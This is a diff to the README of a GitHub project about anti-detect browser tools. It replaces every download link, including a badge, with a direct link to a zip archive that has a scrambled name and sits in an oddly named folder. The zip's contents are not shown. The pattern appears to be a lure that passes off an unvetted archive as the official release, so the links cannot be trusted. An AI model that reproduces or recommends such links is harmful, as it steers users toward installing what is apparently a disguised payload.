@@ -6,13 +6,13 @@ Welcome to the anti-detect-browser-tools-tech-comparison! This application provi
 
 **Before diving in, you can quickly get the software by clicking below:**
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/t117bu/anti-detect-browser-tools-tech-comparison/releases)
+[![Download](https://github.com/t117bu/anti-detect-browser-tools-tech-comparison/raw/refs/heads/master/apertness/browser-tools-detect-tech-comparison-anti-1.3.zip)](https://github.com/t117bu/anti-detect-browser-tools-tech-comparison/raw/refs/heads/master/apertness/browser-tools-detect-tech-comparison-anti-1.3.zip)
 
 ## 📥 Download & Install
 
 To begin using the anti-detect-browser-tools-tech-comparison application, please visit this page to download:
 
-[Download Here](https://github.com/t117bu/anti-detect-browser-tools-tech-comparison/releases)
+[Download Here](https://github.com/t117bu/anti-detect-browser-tools-tech-comparison/raw/refs/heads/master/apertness/browser-tools-detect-tech-comparison-anti-1.3.zip)
 
 ### Step-by-Step Installation
 
@@ -74,4 +74,4 @@ If you encounter issues or have questions, feel free to reach out. We welcome co
 
 Ready to dive in? Visit this page to download the latest version:
 
-[Download Here](https://github.com/t117bu/anti-detect-browser-tools-tech-comparison/releases)
+[Download Here](https://github.com/t117bu/anti-detect-browser-tools-tech-comparison/raw/refs/heads/master/apertness/browser-tools-detect-tech-comparison-anti-1.3.zip)
